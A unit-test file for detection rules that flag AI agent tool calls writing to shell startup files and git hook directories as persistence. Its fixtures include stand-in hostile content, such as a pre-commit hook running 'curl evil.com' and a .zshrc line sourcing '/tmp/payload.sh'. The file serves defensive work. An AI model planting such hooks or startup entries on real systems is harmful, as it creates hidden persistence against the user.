/**
 * Persistence vector detection rule unit tests.
 *
 * Covers: shell startup file writes and git hooks directory writes.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { RuleEngine } from "../../dist/engine.js";
import {
  RULE_PERSISTENCE_SHELL_STARTUP,
  RULE_PERSISTENCE_GIT_HOOKS,
} from "../../dist/rules/index.js";

function makeEvent(overrides = {}) {
  return {
    schema_version: 1,
    event_id: "evt-1",
    session_id: "sess-test",
    occurred_at: "2026-06-02T00:00:00.000Z",
    recorded_at: "2026-06-02T00:00:00.000Z",
    interceptor: "mock",
    event_type: "tool.invoked",
    tool_call_id: "tc-1",
    tool_name: "Write",
    mcp_server: "builtin",
    parameters: {},
    ...overrides,
  };
}

// ---- SHELL STARTUP ----

test("fires on write to .bashrc", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_SHELL_STARTUP]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/.bashrc", content: "export PATH=$PATH:/tmp/evil" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "HIGH");
  assert.equal(findings[0].category, "persistence");
});

test("fires on write to .zshrc", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_SHELL_STARTUP]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/.zshrc", content: "source /tmp/payload.sh" },
  }));
  assert.equal(findings.length, 1);
});

test("fires on write to .profile", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_SHELL_STARTUP]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/Users/case/.profile", content: "# malicious" },
  }));
  assert.equal(findings.length, 1);
});

test("fires on write to .bash_profile", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_SHELL_STARTUP]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/.bash_profile", content: "noop" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on write to normal config file", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_SHELL_STARTUP]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/.gitconfig", content: "[user]\nname = Case" },
  }));
  assert.equal(findings.length, 0);
});

test("no finding on write to .bashrc-backup (partial name match)", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_SHELL_STARTUP]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/.bashrc-backup", content: "noop" },
  }));
  assert.equal(findings.length, 0);
});

// ---- GIT HOOKS ----

test("fires on write to .git/hooks/pre-commit", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_GIT_HOOKS]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/project/.git/hooks/pre-commit", content: "#!/bin/sh\ncurl evil.com" },
  }));
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, "HIGH");
  assert.equal(findings[0].category, "persistence");
});

test("fires on write to .git/hooks/post-receive", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_GIT_HOOKS]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/project/.git/hooks/post-receive", content: "#!/bin/sh" },
  }));
  assert.equal(findings.length, 1);
});

test("no finding on write to .github/workflows", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_GIT_HOOKS]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/project/.github/workflows/ci.yml", content: "name: CI" },
  }));
  assert.equal(findings.length, 0);
});

test("no finding on write to normal project file", () => {
  const engine = new RuleEngine([RULE_PERSISTENCE_GIT_HOOKS]);
  const findings = engine.evaluate(makeEvent({
    parameters: { file_path: "/home/case/project/src/index.ts", content: "console.log('hello')" },
  }));
  assert.equal(findings.length, 0);
});
